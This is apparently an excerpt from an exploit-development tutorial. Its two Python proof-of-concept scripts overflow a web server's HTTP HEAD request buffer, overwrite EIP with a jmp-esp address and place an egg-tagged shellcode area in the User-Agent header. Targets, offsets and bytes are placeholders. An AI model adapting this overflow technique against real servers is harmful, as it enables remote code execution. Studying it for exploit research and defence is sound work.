PROOF OF CONCEPT (POC)

Example Connection WEB Application POC [poc-test.py]

#!/usr/bin/python

import socket
import os
import sys

host = "x.x.x.x"
port = 8080
buffer = "A" * xxx

header = (
"HEAD /" + buffer + " HTTP/1.1\r\n"
"Host: x.x.x.x:8080\r\n"
"User-Agent: SEC4US 0xffff\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host,port))
print "Injection %s bytes" % len(buffer)
expl.send(header)
expl.close()

9 - Shellcode Space

it is time to discover a new point to fit a shellcode, for example, we can put in User-Agent on the header

#!/usr/bin/python

import socket
import os
import sys

host = "x.x.x.x"
port = 8080

shellcode = "T00WT00W"
shellcode += "C" * 400

offset = "A" * yyy
eip = jmpesp-address
esp = \xEB\x??
buffer = offset + eip + esp

header = (
"HEAD /" + buffer + " HTTP/1.1\r\n"
"Host: x.x.x.x:8080\r\n"
"User-Agent: " + shellcode + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host,port))
print "Injection %s bytes" % len(buffer)
expl.send(header)
expl.close()
